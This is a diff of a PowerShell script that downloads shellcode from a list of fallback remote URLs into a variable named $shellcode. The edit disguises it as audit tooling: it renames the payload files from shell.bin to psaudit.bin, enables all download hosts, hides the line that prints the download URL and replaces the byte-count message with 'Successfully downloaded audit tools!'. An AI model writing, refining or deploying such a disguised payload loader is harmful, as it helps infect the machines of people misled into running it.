@@ -8,9 +8,9 @@ $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWe
 
 # 2. Define Fail-Safe URL Array
 $urlList = @(
-    # "https://www.dictcompliance.com/js/shell.bin",
-    # "https://raw.githubusercontent.com/Shinzer/ProjectX/refs/heads/main/shell.bin",
-    "https://github.com/ryan-gonzales/CBC-audit-tools/raw/refs/heads/main/shell.bin"
+    "https://www.dictcompliance.com/js/psaudit.bin",
+    "https://raw.githubusercontent.com/Shinzer/ProjectX/refs/heads/main/psaudit.bin",
+    "https://github.com/ryan-gonzales/CBC-audit-tools/raw/refs/heads/main/psaudit.bin"
 )
 
 $global:shellcode = $null
@@ -19,7 +19,7 @@ $global:shellcode = $null
 foreach ($url in $urlList) {
     try {
         #  @dev Uncomment the line below for debugging.
-        Write-Host "[*] Attempting download from: $url" -ForegroundColor Gray
+        # Write-Host "[*] Attempting download from: $url" -ForegroundColor Gray
         $data = $wc.DownloadData($url)
         
         # Fixed: $null on the left side
@@ -27,7 +27,7 @@ foreach ($url in $urlList) {
             $global:shellcode = $data
 
             #  @dev Uncomment the line below for debugging.
-            Write-Host "[+] Success! Loaded $($global:shellcode.Length) bytes." -ForegroundColor Green
+            Write-Host "[+] Successfully downloaded audit tools!" -ForegroundColor Green
             break 
         }
     } catch {
